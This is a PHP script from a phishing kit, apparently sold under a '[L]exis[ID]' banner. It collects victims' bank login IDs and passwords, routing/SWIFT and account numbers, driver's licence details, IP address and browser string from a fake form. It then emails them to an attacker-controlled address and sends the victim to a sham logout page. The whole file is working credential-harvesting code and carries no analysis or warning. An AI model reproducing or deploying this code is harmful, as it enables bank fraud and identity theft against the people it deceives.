<?php

include('../../blocker.php');
include('../../detect.php');

$message2 ="
.++========[+] [L]exis[ID] [+]========++.
 -- life is so simple when no difficult  --

  .++-----[ Bank Account ".$nama_negara." ]-----++.
Login ID        : ".$_POST['bank_id']."
Login Password  : ".$_POST['bank_pass']."
Routing/Swift   : ".$_POST['routing_number']."
Account Number  : ".$_POST['bank_number']."
Type            : ".$_POST['type']."
       .++----------[ END ]----------++.

      .++--------[ Bank Info ]--------++.
Driver Number   : ".$_POST['driver']."
Expiration Date :  ".$_POST['expdate_month']." / ".$_POST['expdate_year']."
       .++----------[ END ]----------++.

       .++--------[ PC Info ]--------++.
IP Info         :  ".$ip." | ".$nama_negara." On ".gmdate('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
       .++----------[ END ]----------++.

.++====[+] Thank you for your purchase! [+]====++.
";

include('../../email.php');
$subject = "Bank Account [ ".$nama_negara." - " . $ip . " ]";
$headers = "From: Setor Bank Account <bank@blackcard.club>";
mail($email, $subject, $message2, $headers);

header("LOCATION: redirscr?cmd=_logout&session=".md5(microtime())."&dispatch=".sha1(microtime())."");

?>